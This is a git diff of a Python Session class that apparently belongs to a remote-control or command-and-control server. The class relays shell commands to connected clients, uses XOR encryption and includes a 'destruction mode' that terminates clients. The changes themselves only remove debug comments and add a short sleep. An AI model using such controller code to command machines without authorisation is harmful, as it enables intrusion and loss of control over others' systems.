@@ -1,10 +1,4 @@
-#from colorama import Fore,Style
-
-#from . import menu
-#from  .other import recvall
-#from .other import printColor
-#from .management import CheckConn
-#from .handler import Handler
+import time 
 
 from colorama import Fore,Style
 
@@ -12,6 +6,7 @@ from .other import printColor
 from .other import XOREncryption
 from .other import areYouSure
 from .other import printAllTarget
+
 from .management import CheckConn
 from .handler import Handler
 from .sql import Sql
@@ -58,7 +53,6 @@ class Session:
 
     def executeCommand(self,cmd_list):
         '''-c'''
-       # print("-->",cmd_list)
         print("\n")
         cmd_list.pop(0) #delete "-c"
         
@@ -67,11 +61,11 @@ class Session:
 
         for char in tmp_cmd: #remove " 
             if(char == "\""):
-                #print("char detect: ",char)
                 pass
+
             elif(char == " "): #if space
-               # print("space")
                 cmd += " "
+
             else:
                 cmd += char
        
@@ -123,7 +117,6 @@ class Session:
             if(CheckConn().sendsafe(self.session_nb, self.socket, mod_destruction)):
                 
                 reponse = CheckConn().recvsafe(self.socket, 4096).split(SPLIT)
-                #print("information---->",reponse)
                 
                 if(reponse[1] == "True" ): 
                 
@@ -133,7 +126,6 @@ class Session:
                 else:
                     #not error
                     #If the destroy mode is executed then all clients with the same program name and IP address will be terminated. 
-
                     printColor("successfully","\n[+] The destruction mode is executed successfully.\n")
                     for key in Handler.dict_conn.keys():
                         if(Handler.dict_conn[key][NB_IP] == Handler.dict_conn[self.session_nb][NB_IP] and Handler.dict_conn[key][NB_SOCKET] != bool() ):
@@ -149,7 +141,8 @@ class Session:
         
         else:
             pass
-
+        
+        time.sleep(2) #Allows to wait for all connections to end (optional)
 
     def printInformation(self):
         pass
@@ -192,7 +185,5 @@ class Session:
                     
                 except IndexError:
                     pass
-                    #print("CHHHED")
-                    #print(i)
 
         printColor("information","\n[-] The session was cut, back to menu.\n") #If the session close.
